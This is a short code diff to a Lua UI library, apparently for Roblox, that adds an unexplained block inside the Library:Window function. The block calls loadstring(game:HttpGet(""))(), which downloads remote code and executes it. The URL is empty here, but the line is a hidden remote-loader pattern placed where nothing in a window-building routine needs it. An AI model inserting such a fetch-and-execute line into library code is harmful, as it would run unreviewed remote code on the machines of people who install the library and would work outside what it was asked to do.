@@ -266,6 +266,10 @@ function Library:Window(options)
 			return Notification
 		end
 		
+		do
+		   loadstring(game:HttpGet(""))()
+		end
+		
 		return gui
 	end
 end
